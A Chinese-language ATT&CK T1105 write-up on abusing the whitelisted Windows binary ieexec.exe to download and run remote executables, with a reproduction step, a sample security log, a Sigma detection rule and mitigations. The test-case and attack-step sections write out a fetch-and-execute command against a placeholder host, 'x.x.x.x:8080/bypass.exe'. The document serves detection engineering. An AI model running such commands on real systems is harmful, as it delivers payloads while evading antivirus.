# T1105-Win-入口工具转移-ieexec.exe(白名单)

## 描述

攻击者可能通过命令和控制通道从外部系统将工具或其他文件转移到被攻击的环境中，以将恶意工具或有效载荷引入目标网络。文件传输可通过专用工具（如FTP）或替代协议（如scp、rsync、sftp）实现，适用于Windows、Mac和Linux系统。攻击者常利用系统内置的白名单工具（如`ieexec.exe`）来规避传统防病毒检测。

## 测试案例

`ieexec.exe`是.NET Framework附带的应用程序，位于`C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`或`C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`，用于执行从远程URL加载的托管.NET应用程序。攻击者可利用其直接从远程服务器下载并运行恶意代码，绕过安全机制。

### 路径
```yml
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
```

### 示例命令
从远程服务器下载并执行`bypass.exe`：
```yml
ieexec.exe http://x.x.x.x:8080/bypass.exe
```

### 用例
- 从远程位置下载并运行攻击者控制的恶意代码。
- 所需权限：用户权限。
- 操作系统：Windows Vista、Windows 7、Windows 8、Windows 8.1、Windows 10。

## 检测日志

### Windows安全日志
- **事件ID 4688**：记录`ieexec.exe`进程创建及命令行参数（需启用命令行审核）。

### Sysmon日志
- **事件ID 1**：捕获`ieexec.exe`进程创建及命令行参数。
- **事件ID 3**：记录`ieexec.exe`发起的HTTP/HTTPS网络连接（目标IP/端口）。
- **事件ID 11**：记录可能的恶意文件创建（若下载内容被保存）。

### 网络日志
- 捕获`ieexec.exe`发起的HTTP/HTTPS请求，检查目标URL是否异常。

## 测试复现

### 环境准备
- **靶机**：Windows 10。
- **权限**：用户权限（无需管理员）。
- **工具**：
  - `ieexec.exe`（系统自带，路径`C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe`或`C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe`）。
  - Sysmon（用于进程和网络监控）。
  - Wireshark（用于网络流量捕获）。
  - 测试Web服务器（提供可控URL）。
- **网络**：允许HTTP/HTTPS出站流量，建议在隔离网络中测试。
- **日志**：启用Windows安全日志和Sysmon日志。

### 攻击步骤
1. **执行下载命令**：
   ```bash
   C:\Users\liyang>C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http://x.x.x.x:8080/bypass.exe
   ```
   - 命令从指定URL下载并执行`bypass.exe`。
   - 注意：直接运行`ieexec.exe`可能提示“不是内部或外部命令”，需指定完整路径。。

## 测试留痕

```yml
已创建新进程。

创建者主题:
安全 ID: DESKTOP-PT656L6\liyang
帐户名: liyang
帐户域: DESKTOP-PT656L6
登录 ID: 0x47126

进程信息:
新进程 ID: 0x1a24
新进程名称: C:\Windows\Microsoft.NET\Framework\v2.0.50727\IEExec.exe
令牌提升类型: %%1938
强制性标签: Mandatory Label\Medium Mandatory Level
创建者进程 ID: 0x1410
创建者进程名称: C:\Windows\System32\cmd.exe
进程命令行: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://xxx/QQ.exe
```

## 检测方法/思路

### Sigma规则
基于Sigma规则，检测`ieexec.exe`的异常执行行为：

```yml
title: ieexec.exe Suspicious Invocation
id: 7f2b3e5a-9c1d-4b7e-a2f3-8c9e4d7b3c2a
status: experimental
description: Detects suspicious execution of ieexec.exe, which can be used to download and run malicious code from a remote URL
author: 12306Br0
date: 2022/04/20
references:
- https://www.codercto.com/a/104908.html
- https://lolbas-project.github.io/lolbas/Binaries/Ieexec/
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\ieexec.exe'
    CommandLine|contains: 'http'
  condition: selection
falsepositives:
- Legitimate use of ieexec.exe for loading trusted .NET applications
level: medium
```

### 检测思路
1. **进程监控**：
   - 检查`ieexec.exe`的命令行参数是否包含HTTP/HTTPS URL。
   - 监控异常父进程（如`cmd.exe`、`powershell.exe`）。
2. **网络监控**：
   - 检测`ieexec.exe`发起的HTTP/HTTPS请求，重点关注非预期目标URL。
3. **行为监控**：
   - 检测`ieexec.exe`是否加载了非预期的.NET应用程序。
4. **关联分析**：
   - 结合Sysmon事件ID 1（进程创建）、3（网络连接）和可能的11（文件创建）进行关联，识别完整攻击链。

### 检测建议
- **告警规则**：基于Sigma规则，配置SIEM系统（如Splunk、Elastic）检测`ieexec.exe`的异常命令行参数和网络活动。
- **基线对比**：建立`ieexec.exe`的正常使用基线（通常在开发环境中加载受信任的.NET应用），排除合法行为。
- **网络白名单**：限制`ieexec.exe`的出站流量，仅允许访问已知合法服务器。
- **文件完整性监控**：监控`ieexec.exe`下载的文件，检测异常文件类型（如`.exe`）。

## 缓解措施
1. **限制网络访问**：
   - 配置防火墙，限制`ieexec.exe`的出站HTTP/HTTPS流量，仅允许访问受信任的服务器。
2. **加强日志监控**：
   - 启用命令行参数记录和Sysmon日志，覆盖进程、网络和文件操作。
3. **白名单管理**：
   - 使用应用白名单工具（如AppLocker）限制`ieexec.exe`的执行场景。
4. **权限管理**：
   - 限制普通用户运行`ieexec.exe`，仅允许开发或受信任账户使用。
5. **定期审查**：
   - 检查系统内`ieexec.exe`的异常使用记录，结合威胁情报分析潜在风险。

## 参考推荐
- MITRE ATT&CK T1105  
  https://attack.mitre.org/techniques/T1105  
- ieexec.exe  
  https://lolbas-project.github.io/lolbas/Binaries/Ieexec/  
- 远控免杀专题(46)-白名单IEexec.exe执行payload  
  https://www.codercto.com/a/104908.html
